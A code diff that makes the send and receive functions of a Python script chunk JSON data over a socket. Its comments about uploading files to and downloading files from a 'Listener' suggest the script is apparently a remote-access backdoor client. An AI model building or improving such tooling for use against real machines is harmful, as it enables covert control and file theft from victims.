@@ -11,21 +11,36 @@ import platform
 
 def reliable_send(data):
     json_data = json.dumps(data)
-    s.send(json_data.encode())
+    json_bytes = json_data.encode()
+
+    # Send the data in chunks to handle larger data
+    chunk_size = 1024
+    total_bytes_sent = 0
+    while total_bytes_sent < len(json_bytes):
+        chunk = json_bytes[total_bytes_sent:total_bytes_sent + chunk_size]
+        bytes_sent = s.send(chunk)
+        if bytes_sent == 0:
+            # The socket has been closed, or there was an issue with the connection.
+            raise ConnectionError("Socket connection closed or encountered an issue.")
+        total_bytes_sent += bytes_sent
 
 
 def reliable_receive(s):
-    json_data = ""
+    json_data = b""
     while True:
+        chunk = s.recv(1024)
+        if not chunk:
+            raise ConnectionError("Socket connection closed or encountered an issue.")
+        json_data += chunk
         try:
-            json_data += s.recv(1024).decode()
-            return json.loads(json_data)
-        except ValueError:
+            decoded_data = json.loads(json_data.decode())
+            return decoded_data
+        
+        except json.JSONDecodeError:
             continue
 
+
 # Read file For Upload To Listener
-
-
 def read_file(path):
     try:
         path = os.path.normpath(path)
@@ -35,8 +50,6 @@ def read_file(path):
         return ("[-] Error " + str(e)[10:])
 
 # Download File From Listener
-
-
 def write_file(path, content):
     try:
         # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
